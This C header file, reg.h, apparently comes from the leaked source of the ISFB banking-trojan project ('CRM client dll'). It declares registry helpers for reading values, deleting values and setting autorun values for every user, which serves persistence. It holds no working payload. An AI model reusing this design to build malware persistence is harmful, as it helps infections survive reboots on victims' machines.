//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: reg.h
// $Revision: 405 $
// $Date: 2014-11-20 18:43:41 +0300 (Чт, 20 ноя 2014) $
// description:
//	CRM client dll. Registry manipulation functions. 

//
//	Allocates a memory and loads the specified registry value into it.
//
WINERROR LoadRegistryValueW(
	HKEY	ParentKey,	// parent key name
	LPWSTR	KeyName,	// target key name
	LPWSTR	ValueName,	// value name
	PCHAR*	pValue,		// receives pointer the allocated memory containing the specified value
	PULONG	pSize,		// receives size of the value
	PULONG	pType		// receives type of the value
	);

WINERROR LoadRegistryValueA(
	HKEY	ParentKey,	// parent key name
	LPSTR	KeyName,	// target key name
	LPSTR	ValueName,	// value name
	PCHAR*	pValue,		// receives pointer the allocated memory containing the specified value
	PULONG	pSize,		// receives size of the value
	PULONG	pType		// receives type of the value
	);

#if _UNICODE
	#define	LoadRegistryValue	LoadRegistryValueW
#else
	#define	LoadRegistryValue	LoadRegistryValueA
#endif

WINERROR RegReadDwordW(
	HKEY	ParentKey,	// parent key name
	LPWSTR	KeyName,	// target key name
	LPWSTR	ValueName,	// value name
	PDWORD	pValue
	);

WINERROR RegReadDwordA(
	HKEY	ParentKey,	// parent key name
	LPSTR	KeyName,	// target key name
	LPSTR	ValueName,	// value name
	PDWORD	pValue
	);

#if _UNICODE
	#define	RegReadDword	RegReadDwordW
#else
	#define	RegReadDword	RegReadDwordA
#endif

DWORD RegReadStringW(
	HKEY	ParentKey,	// parent key name
	LPWSTR	KeyName,	// target key name
	LPWSTR	ValueName,	// value name
	LPWSTR*	pValue,		// receives pointer the allocated memory containing the specified value
	PULONG	pSize		// receives size of the value
	);

DWORD RegReadStringA(
	HKEY	ParentKey,	// parent key name
	LPSTR	KeyName,	// target key name
	LPSTR	ValueName,	// value name
	PCHAR*	pValue,		// receives pointer the allocated memory containing the specified value
	PULONG	pSize		// receives size of the value
	);

#if _UNICODE
	#define	RegReadString	RegReadStringW
#else
	#define	RegReadString	RegReadStringA
#endif

WINERROR RegDeleteValueExA(
	HKEY	ParentKey,	// parent key name
	LPSTR	KeyName,	// target key name
	LPSTR	ValueName	// value name
	);

WINERROR RegDeleteValueExW(
	HKEY	ParentKey,	// parent key name
	LPWSTR	KeyName,	// target key name
	LPWSTR	ValueName	// value name
	);

#if _UNICODE
	#define	RegDeleteValueEx	RegDeleteValueExW
#else
	#define	RegDeleteValueEx	RegDeleteValueExA
#endif


WINERROR RegEnumUsersSetAutorun(
	LPTSTR	pName,		// autorun value name
	LPTSTR	pPath,		// path to register. If NULL the value will be removed.
	ULONG	KeyFlags	// key flags
	);